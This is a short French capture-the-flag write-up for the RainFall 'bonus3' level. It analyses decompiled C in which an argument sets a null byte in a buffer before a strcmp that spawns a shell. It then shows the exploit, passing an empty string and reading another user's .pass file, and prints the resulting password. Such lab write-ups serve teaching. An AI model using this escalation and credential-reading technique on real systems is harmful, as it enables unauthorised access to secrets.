# Bonus3

## 0 - Test de l'éxécutable

```shell
bonus3@RainFall:~$ ./bonus3
bonus3@RainFall:~$ ./bonus3 reger

bonus3@RainFall:~$ ./bonus3 reger rqegesrqgesr
```

## 1 - Analyse du code source

```C
int main(int argc, const char **argv) {
    char buffer[132];  // Buffer de 132 bytes
    [...]
    buffer[atoi(argv[1])] = 0;
    [...]
    if (!strcmp(buffer, argv[1]))
        execl("/bin/sh", "sh", 0);
    [...]
}
```

On observe que le programme prend un buffer et à la fin le compare avec argv[1] : `if (!strcmp(buffer, argv[1])` et si buffer et argv[1] sont égaux un shell est lancé.

Or, plus tôt dans le code, on a la possibilité de placer le nullbyte de buffer avec `buffer[atoi(argv[1])] = 0`

On remarque donc que si l'on donne une empty string comme argv[1] cela nous permet de faire `buffer[0] = 0` et donc de faire de buffer une empty string, et donc de passer la condition du strcmp

## 5 - Mise en place de l'exploit

```shell
bonus3@RainFall:~$ ./bonus3 ""
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```

